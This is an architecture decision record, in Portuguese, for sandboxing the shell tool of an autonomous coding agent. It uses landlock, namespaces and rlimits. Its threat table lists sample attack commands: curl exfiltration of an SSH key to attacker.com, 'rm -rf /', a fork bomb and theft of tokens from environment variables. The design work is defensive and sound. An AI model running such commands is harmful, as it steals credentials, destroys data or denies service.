# ADR-002: Sandbox de Execucao Segura

**Status:** Aceito
**Data:** 2026-04-01
**Autor:** Paulo (Staff-level review + multi-agent meeting)
**Escopo:** theo-domain (tipos), theo-tooling (executor), theo-governance (policy)

---

## Contexto

O Theo Code e um agente autonomo de codificacao que executa comandos shell arbitrarios via `BashTool`. O fluxo atual:

```
LLM gera comando → Governance aprova → BashTool executa sem restricao
```

Apos a aprovacao, o comando roda com os mesmos privilegios do processo pai. Nao existe isolamento de filesystem, rede, ou recursos.

### Vetores de ataque confirmados

| # | Vetor | Exemplo | Severidade |
|---|---|---|---|
| 1 | Exfiltracao de dados | `curl https://attacker.com -d "$(cat ~/.ssh/id_rsa)"` | CRITICAL |
| 2 | Destruicao | `rm -rf /` ou `git push --force origin main` | CRITICAL |
| 3 | Fork bomb / DoS | `:(){ :|:& };:` | HIGH |
| 4 | Interpreter escape | `python3 -c "import os; os.system('...')"` | HIGH |
| 5 | TOCTOU | Script muda entre aprovacao e execucao | HIGH |
| 6 | Token leaking | Env vars (AWS_SECRET_KEY, GITHUB_TOKEN) acessiveis | HIGH |
| 7 | Side-channel | Exfiltracao via DNS queries | MEDIUM |
| 8 | Toxic combinations | Comandos inofensivos que juntos sao perigosos | MEDIUM |

### Evidencia: BashTool atual

`crates/theo-tooling/src/bash/mod.rs` linha 183: `Command::new("sh").arg("-c").arg(&command)` — string bruta sem kernel-level isolation. `detect_external_paths()` e heuristica, nao enforcement.

---

## Decisao

Implementar sandbox de execucao em 6 fases incrementais, cada uma com gate go/no-go explicito. O sandbox complementa o sistema de permissoes — nao o substitui.

### Principios inquebraveis

1. **Fail-closed**: sandbox indisponivel = rejeitar execucao. NUNCA fallback silencioso.
2. **Defense in depth**: sandbox e UMA camada. Permissoes + governance + sandbox juntas.
3. **Default deny**: tudo bloqueado por padrao. Whitelist explicita para o que e permitido.
4. **Separacao de responsabilidades**: governance decide, sandbox isola, tool executa.
5. **Observabilidade**: toda acao do sandbox gera log estruturado. Bloqueio silencioso e bug.

### Instabilidade controlada

Os tipos definidos na Fase 1 podem mudar nas fases subsequentes sem breaking change externo. O modulo `sandbox` no theo-domain nao e consumido por nenhum crate externo ate a Fase 2. Isso permite iterar nos tipos conforme a implementacao real com landlock/namespaces revela restricoes.

---

## Modelo Arquitetural

```
┌──────────────────────────────────────────────────────┐
│                  theo-governance                      │
│  Permission Engine + Sandbox Policy Engine            │
│  → Decide: aprovar/rejeitar + gera SandboxConfig      │
└────────────────────────┬─────────────────────────────┘
                         │ SandboxConfig
┌────────────────────────▼─────────────────────────────┐
│                   theo-tooling                        │
│  ┌────────────────────────────────────────────────┐  │
│  │            Sandbox Executor                     │  │
│  │  Filesystem (landlock) + Process (namespace)    │  │
│  │  Network (netns) + Resources (rlimit)           │  │
│  │  Env sanitizer + Audit logger + Cleanup         │  │
│  └────────────────────┬───────────────────────────┘  │
│  ┌────────────────────▼───────────────────────────┐  │
│  │  BashTool.execute() dentro do sandbox           │  │
│  └────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────┘
                         │
┌────────────────────────▼─────────────────────────────┐
│                   theo-domain                         │
│  Tipos puros: SandboxConfig, FilesystemPolicy,        │
│  NetworkPolicy, ProcessPolicy, ResourceLimits,        │
│  SandboxResult, SandboxViolation, AuditEntry          │
│  (zero dependencias de OS, zero async)                │
└──────────────────────────────────────────────────────┘
```

### Fluxo de execucao

```
1. LLM gera comando
2. Governance: approve/reject + sequence analysis
3. SandboxPolicyEngine: gera SandboxConfig para ESTE comando
4. SandboxExecutor:
   a. Kernel probe (landlock disponivel?)
   b. Se indisponivel → SandboxError::Unavailable → REJECT
   c. Criar namespaces (pid, net, mount)
   d. Aplicar landlock (restricoes de fs)
   e. Setar rlimits (cpu, mem, fsize, nproc)
   f. Sanitizar env vars (whitelist)
   g. Iniciar audit logger
   h. Fork + exec comando no sandbox
   i. Coletar stdout/stderr
   j. Registrar violacoes
   k. Cleanup artefatos temporarios
   l. Retornar SandboxResult
5. Output para o agent loop
```

---

## Mecanismos de isolamento por fase

| Fase | Mecanismo | Kernel minimo | Root? | O que protege |
|---|---|---|---|---|
| 2 | landlock | Linux 5.13 | Nao | Filesystem read/write |
| 3 | setrlimit | Qualquer | Nao | CPU, memoria, fsize, nproc |
| 3 | PID namespace | Linux 3.8 | User ns | Fork bombs, process visibility |
| 4 | Network namespace | Linux 3.8 | User ns | Exfiltracao de rede |
| 4 | Capability drop | Linux 2.2 | Nao | Privilege escalation |

---

## O que foi rejeitado

| Alternativa | Motivo da rejeicao |
|---|---|
| Docker/container por execucao | Overhead de 200-500ms por exec. Inviavel para tool calls frequentes. |
| seccomp-bpf | Complexo demais para fase inicial. Considerar em fase futura. |
| eBPF monitoring | Requer root e kernel 5.x. Monitoramento, nao enforcement. |
| Wasm sandbox | Nao suporta fork/exec de binarios nativos. |
| chroot | Insuficiente sem namespaces. Escape trivial com mount. |

---

## Riscos conhecidos

1. **macOS**: sandbox-exec deprecated, sem alternativa nativa madura. Fase 6 pode exigir abordagem container-based.
2. **Container environments**: Docker/WSL2 ja tem namespaces — composicao pode conflitar. Test matrix obrigatorio.
3. **Namespace leak**: em alta carga, namespaces zombies acumulam. Reaper obrigatorio na Fase 3.
4. **Overhead**: 2-5ms por exec com namespaces. Aceitavel para tool calls (< 1% do tempo total).
5. **Manutencao**: cada mecanismo e superficie de manutencao. Code de sandbox desatualizado e pior que nao ter.

---

## Consequencias

### Positivas
- Agente autonomo com isolamento kernel-level
- Defense in depth: governance + permissoes + sandbox
- Diferencial competitivo (poucos code agents tem sandbox real)
- Audit trail completo de cada execucao

### Negativas
- Complexidade: 6 fases, multiplos mecanismos OS-level
- Linux-first: macOS como cidadao de segunda classe inicialmente
- Overhead de 2-5ms por exec
- Manutencao de codigo de seguranca exige expertise especifica
